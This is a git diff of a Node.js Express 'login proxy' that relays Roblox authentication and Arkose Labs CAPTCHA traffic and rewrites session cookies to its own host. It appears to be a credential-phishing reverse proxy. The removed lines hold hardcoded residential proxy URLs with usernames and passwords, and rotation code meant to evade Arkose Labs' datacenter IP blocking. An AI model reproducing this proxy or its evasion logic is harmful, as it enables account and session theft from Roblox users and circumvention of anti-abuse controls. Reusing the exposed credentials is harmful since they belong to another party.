@@ -2,30 +2,12 @@ const express = require('express');
 const { createProxyMiddleware, responseInterceptor } = require('http-proxy-middleware');
 const https = require('https');
 const http = require('http');
-const { HttpsProxyAgent } = require('https-proxy-agent');
-const { HttpProxyAgent } = require('http-proxy-agent');
 
 const app = express();
 
 console.log('='.repeat(60));
-console.log('🔒 PURE LOGIN PROXY - WITH RESIDENTIAL PROXY SUPPORT');
+console.log('🔒 PURE LOGIN PROXY - WITH FULL ARKOSE SUPPORT');
 console.log('='.repeat(60));
-
-// Residential proxies for Arkose Labs (to bypass datacenter IP blocking)
-const RESIDENTIAL_PROXIES = [
-    'http://104574_FmGRR_s_1KB03APR4ILFSCMW:HoxFFU3jQA@residential.pingproxies.com:8872',
-    'http://104574_FmGRR_s_BAY283TIWZ05HV2A:HoxFFU3jQA@residential.pingproxies.com:8392',
-    'http://104574_FmGRR_s_Y3QTLQRA0S49RUWK:HoxFFU3jQA@residential.pingproxies.com:8269',
-    'http://104574_FmGRR_s_L8K0M14X3H8KAIOL:HoxFFU3jQA@residential.pingproxies.com:8221',
-    'http://104574_FmGRR_s_Q4FLL3QJZ46JQ2YF:HoxFFU3jQA@residential.pingproxies.com:8977',
-];
-
-let proxyIndex = 0;
-function getNextResidentialProxy() {
-    const proxy = RESIDENTIAL_PROXIES[proxyIndex];
-    proxyIndex = (proxyIndex + 1) % RESIDENTIAL_PROXIES.length;
-    return proxy;
-}
 
 // Shared HTTPS agent with keep-alive for connection pooling
 const httpsAgent = new https.Agent({
@@ -1206,19 +1188,8 @@ app.options('*', (req, res) => {
 });
 
 function createRobloxProxy(prefix, target) {
+    const agent = target.startsWith('https:') ? httpsAgent : httpAgent;
     const isArkose = target.includes('arkoselabs.com') || target.includes('funcaptcha.com') || target.includes('rbxcdn.com');
-    
-    // Use residential proxy for Arkose Labs to bypass IP blocking
-    let agent;
-    if (isArkose) {
-        const proxyUrl = getNextResidentialProxy();
-        agent = target.startsWith('https:') 
-            ? new HttpsProxyAgent(proxyUrl)
-            : new HttpProxyAgent(proxyUrl);
-        console.log(`[${prefix}] Using residential proxy: ${proxyUrl.split('@')[1]}`);
-    } else {
-        agent = target.startsWith('https:') ? httpsAgent : httpAgent;
-    }
     
     return createProxyMiddleware({
         target,
@@ -1258,11 +1229,6 @@ function createRobloxProxy(prefix, target) {
             },
 
             proxyRes: (proxyRes, req) => {
-                // Log Arkose Labs responses for debugging
-                if (isArkose) {
-                    console.log(`[${prefix}] ${req.method} ${req.path} → ${proxyRes.statusCode} (via residential proxy)`);
-                }
-                
                 if (proxyRes.headers['set-cookie']) {
                     const host = req.headers.host || 'localhost';
                     proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], host);
